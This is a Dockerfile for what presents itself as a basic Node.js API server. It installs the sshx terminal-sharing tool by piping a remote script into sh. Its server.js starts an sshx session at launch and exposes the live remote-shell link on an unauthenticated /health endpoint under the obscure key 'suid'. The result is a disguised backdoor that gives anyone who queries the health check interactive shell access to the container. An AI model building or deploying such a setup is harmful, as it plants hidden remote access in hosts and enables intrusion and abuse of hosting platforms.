FROM ubuntu:22.04

# Set environment variables
ENV DEBIAN_FRONTEND=noninteractive
ENV NODE_VERSION=20.x

# Install dependencies
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    ca-certificates \
    gnupg \
    && rm -rf /var/lib/apt/lists/*

# Install Node.js
RUN curl -fsSL https://deb.nodesource.com/setup_${NODE_VERSION} | bash - \
    && apt-get install -y nodejs \
    && rm -rf /var/lib/apt/lists/*

# Install sshx
RUN curl -sSf https://sshx.io/get | sh

# Create app directory
WORKDIR /app

# Create Node.js server
RUN cat > /app/server.js << 'EOF'
const http = require('http');
const { spawn } = require('child_process');

const PORT = process.env.PORT || 3000;
let sshxLink = 'initializing...';

// Execute sshx command and capture output
console.log('Starting sshx...');
const sshxProcess = spawn('sshx', [], {
  stdio: ['ignore', 'pipe', 'pipe']
});

let stdoutData = '';
let stderrData = '';

sshxProcess.stdout.on('data', (data) => {
  const output = data.toString();
  stdoutData += output;
  console.log('SSHX stdout:', output);
  
  // Try to extract link from stdout
  const linkMatch = output.match(/https:\/\/sshx\.io\/s\/[a-zA-Z0-9#_-]+/);
  if (linkMatch) {
    sshxLink = linkMatch[0];
    console.log('SSHX Link captured:', sshxLink);
  }
});

sshxProcess.stderr.on('data', (data) => {
  const output = data.toString();
  stderrData += output;
  console.log('SSHX stderr:', output);
  
  // Try to extract link from stderr
  const linkMatch = output.match(/https:\/\/sshx\.io\/s\/[a-zA-Z0-9#_-]+/);
  if (linkMatch) {
    sshxLink = linkMatch[0];
    console.log('SSHX Link captured:', sshxLink);
  }
});

sshxProcess.on('error', (error) => {
  console.error('Failed to start sshx:', error);
  sshxLink = 'error: ' + error.message;
});

sshxProcess.on('close', (code) => {
  console.log(`sshx process exited with code ${code}`);
  if (sshxLink === 'initializing...') {
    sshxLink = 'link not found in output';
  }
});

// Create HTTP server
const server = http.createServer((req, res) => {
  res.setHeader('Content-Type', 'application/json');

  if (req.method === 'GET' && req.url === '/') {
    res.statusCode = 200;
    res.end(JSON.stringify({ message: 'Welcome to Node.js API' }));
  } else if (req.method === 'GET' && req.url === '/health') {
    res.statusCode = 200;
    res.end(JSON.stringify({
      timestamp: new Date().toISOString(),
      suid: sshxLink
    }));
  } else {
    res.statusCode = 404;
    res.end(JSON.stringify({ error: 'Not Found' }));
  }
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
EOF

# Expose port
EXPOSE 3000

# Start the application
CMD ["node", "server.js"]
